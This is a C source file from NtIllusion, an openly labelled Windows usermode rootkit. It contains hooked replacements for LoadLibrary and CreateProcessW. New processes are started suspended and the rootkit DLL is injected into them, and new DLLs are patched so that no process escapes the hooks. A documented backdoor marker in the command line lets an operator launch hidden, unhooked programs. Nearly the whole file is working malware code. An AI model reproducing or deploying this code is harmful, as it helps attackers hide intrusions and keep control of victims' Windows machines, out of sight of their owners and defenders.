/******************************************************************************
  kNTISpawn.c	: Contains replacements for spawning functions
  *****************************************************************************
  Author		: Kdm (Kodmaker@syshell.org)
  WebSite		: http://www.syshell.org

  Copyright (C) 2003,2004 Kdm
  *****************************************************************************
  This file is part of NtIllusion.

  NtIllusion is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.

  NtIllusion is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with NtIllusion; if not, write to the Free Software
  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
  ******************************************************************************/

#include <windows.h>
#include "kNTISpawn.h"
#include "../../Misc/kNTILib.h"
#include "../../Misc/kNTIConfig.h"
#include "../../Engine/Injection/kInjectEng.h"
#include "../../Engine/Hijacking/kHijackEng.h"
// todo ici!
typedef int BOOL;

extern char kNTIDllPath[MAX_PATH];
extern char ExePath[1024+1];

// Pointers to non-hijacked functions
FARPROC fLoadLibrary=NULL;
FARPROC fCreateProcessW=NULL;
FARPROC fGetProcAddress=NULL;

//	o General routines o
//		LoadLibrary : prevent a process from escaping hijack by loading a new dll and calling one of its function
HINSTANCE WINAPI MyLoadLibrary( LPCTSTR lpLibFileName )
{
	HINSTANCE hInst= NULL;
	HMODULE	  hMod = NULL;
	char	 *lDll = NULL;			// dll path in lower case

	OutputString("\n[!] Run time load of DLL => '%s' (%s), patching APIs.\n", lpLibFileName, ExePath);
	
	// Check if Dll was already loaded
	hMod = GetModuleHandle(lpLibFileName);

	hInst = (HINSTANCE) fLoadLibrary(lpLibFileName);
	
	if(hInst) 
	{
		//OutputString(" OK, trying to patch APIs... \n");
		
		// If dll was already loaded, don't set hooks a second time
		if(hMod==NULL)
		{
	
			// Duplicate Dll path "winnt.h"
			lDll = _strdup( (char*)lpLibFileName );
			if(!lDll)
				goto end;
			// Convert it to lower case
			_strlwr(lDll);
			
			SetUpHooks((int)NTI_ON_NEW_DLL, (char*)lDll);
			//HijackApiOfNewModule((HMODULE)hInst, lpLibFileName, "*");
			
			free(lDll);
		}		
	}

end:
  return hInst;
}


//		Backdoor : if application name or command line contains RTK_FILE_CHAR
//		the created process is *not* hooked.
//		Useful to launch hidden process from windows gui/cmd.exe that performs
//		a search before delegating the creation of the process to CreateProcess
//		To launch a non hijacked process using cmd, do the following :
//		run:  cmd.exe
//		type: cmd.exe _nti			(where _nti is RTK_FILE_CHAR )
//		then run your hidden program from the non hijacked shell
BOOL WINAPI MyCreateProcessW(LPCTSTR lpApplicationName, LPTSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, 
LPCTSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)
{
	int bResult, bInject=1;
	char msg[1024], cmdline[256], appname[256];

	OutputString("[i] CreateProcessW()\n");

	// do not rely on info given by HijackApi() since we may have hijacked at GetProcAddress() level

	if(!fCreateProcessW) {
		fCreateProcessW = (FARPROC) fGetProcAddress(GetModuleHandle("kernel32.dll"),"CreateProcessW");
		if(!fCreateProcessW) return 0;
	}


	my_memset(msg, 0, 1024);
	my_memset(cmdline, 0, 256);
	my_memset(appname, 0, 256);
	 //Convert strings from unicode :
	WideCharToMultiByte(CP_ACP, 0,(const unsigned short *)lpApplicationName, -1, appname, 255,NULL, NULL);
	WideCharToMultiByte(CP_ACP, 0,(const unsigned short *)lpCommandLine, -1, cmdline, 255,NULL, NULL);
	OutputString("\n[!!] Hooked CreateProcessW : %s - %s, injecting rootkit (%s)...\n", (char*)appname, (char*)cmdline, (char*)kNTIDllPath);
	
	bResult = (int) fCreateProcessW((const unsigned short *)lpApplicationName,
		(unsigned short *)lpCommandLine, lpProcessAttributes, lpThreadAttributes,
		bInheritHandles, CREATE_SUSPENDED /*dwCreationFlags*/, 
		lpEnvironment, (const unsigned short *)lpCurrentDirectory,	
		(struct _STARTUPINFOW *)lpStartupInfo, lpProcessInformation);
	
	// inject the created process if its name & command line doesn't contain RTK_FILE_CHAR
	if(bResult)
	{
		if(lpCommandLine) {
			if(strstr((char*)cmdline,(char*)RTK_FILE_CHAR)){
				OutputString("\n[i] CreateProcessW: Giving true sight to process '%s'...\n", (char*)appname);
				WakeUpProcess(lpProcessInformation->dwProcessId);
				bInject = 0;
			}
		}
		if(lpApplicationName) {
			if(strstr((char*)appname,(char*)RTK_FILE_CHAR)) {
				OutputString("\n[i] CreateProcessW: Giving true sight to process '%s'...\n", (char*)appname);
				WakeUpProcess(lpProcessInformation->dwProcessId);
				bInject = 0;
			}
		}
		if(bInject) InjectDll(lpProcessInformation->hProcess, (char*)kNTIDllPath);

		CloseHandle(lpProcessInformation->hProcess);
		CloseHandle(lpProcessInformation->hThread); 
		
	}
	return bResult;
}
